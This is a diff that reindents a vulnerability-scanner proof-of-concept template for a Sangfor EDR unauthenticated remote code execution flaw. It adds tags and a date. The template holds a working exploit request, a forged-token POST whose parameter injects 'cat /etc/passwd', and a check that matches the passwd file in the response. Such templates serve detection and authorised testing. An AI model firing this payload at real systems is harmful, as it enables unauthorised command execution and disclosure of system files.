@@ -1,23 +1,24 @@
 id: sangfor-edr-cssp-rce
 
 info:
-    name: Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution
-    author: pikpikcu
-    severity: critical
-    verified: false
-    description: |
-        Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands.
-        app="sangfor"
-    reference:
-        - https://www.cnblogs.com/0day-li/p/13650452.html
+  name: Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution
+  author: pikpikcu
+  severity: critical
+  verified: false
+  description: |
+    Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands.
+    fofa: app="sangfor"
+  reference:
+    - https://www.cnblogs.com/0day-li/p/13650452.html
+  tags: sangfor,edr,rce
+  created: 2023/05/26
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
-            body: |
-                {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: POST
+      path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+      body: |
+        {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
-
